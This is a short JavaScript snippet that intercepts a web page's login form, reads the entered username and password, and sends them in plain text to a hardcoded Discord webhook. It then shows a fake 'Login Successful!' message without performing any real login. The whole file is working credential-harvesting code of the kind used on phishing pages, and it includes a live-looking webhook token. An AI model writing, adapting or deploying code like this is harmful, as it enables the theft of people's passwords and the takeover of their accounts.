function sendLoginDataToDiscord(username, password) {
    // Replace with your Discord webhook URL
    const discordWebhookURL = "https://discord.com/api/webhooks/1169093827785674792/B0JWqdVM9KyFzZsgHVBbNzNsBFNP-X6AqmIKjwUXRbuDHTkFzSTYyoEK16r9NRbgEGL6";

    // Create a JSON payload with the username and password
    const payload = {
        content: `Username: ${username}, Password: ${password}`,
    };

    // Send the payload to the Discord webhook
    fetch(discordWebhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
    })
    .then((response) => {
        if (response.ok) {
            console.log("Login data sent to Discord webhook.");
        } else {
            console.error("Failed to send login data to Discord webhook.");
        }
    })
    .catch((error) => {
        console.error("Error sending data: ", error);
    });
}

// Example usage when the login form is submitted
document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the form from submitting normally

    const username = document.getElementById("loginUsername").value;
    const password = document.getElementById("loginPassword").value;

    // Send the data to Discord
    sendLoginDataToDiscord(username, password);

    // Implement your actual login logic here
    // For this example, we don't have a real login system, so we just simulate success
    alert("Login Successful!");

    // You may redirect the user to a dashboard or another page here
});
